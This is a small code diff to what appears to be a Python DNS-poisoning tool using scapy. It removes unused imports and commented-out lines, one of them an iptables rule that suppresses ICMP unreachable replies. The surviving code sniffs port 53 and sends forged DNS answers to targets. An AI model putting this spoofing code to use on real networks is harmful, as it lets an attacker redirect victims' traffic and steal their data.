@@ -2,10 +2,7 @@ import os
 from typing import Tuple
 from scapy.all import (
     DNSRR,
-    DNSQR,
     DNS,
-    Ether,
-    IP,
     UDP,
     sendp,
     sniff,
@@ -109,13 +106,11 @@ class DNSPoison(PoisonNetwork):
         """
         self.info_logger.debug("Packet crafted: ")
         self.info_logger.debug(response.summary())
-        # if ip_of_the_packet not in self.targets_used:
         self.info_logger.log(
             self.logger_level,
             f"{Fore.CYAN}(DNS) Sending packet to {ip_of_the_packet} responding {resource}{Style.RESET_ALL}",
         )
         sendp(response, verbose=False)
-        # self.targets_used.append(ip_of_the_packet)
 
     def __filter_for_dns(self, pkt: packet) -> bool:
         """[ Filter by sniffed packets of interest ]
@@ -149,8 +144,6 @@ class DNSPoison(PoisonNetwork):
     def start_dns_poisoning(self) -> None:
         """[ Function to start the poisoner ]"""
         self.info_logger.log(self.logger_level, "Starting dns poisoning...")
-        # self._start_cleaner()
-        # os.system("iptables -I OUTPUT -p icmp --icmp-type destination-unreachable -j DROP")
         sniff(
             filter="udp and port 53",
             iface=self.iface,
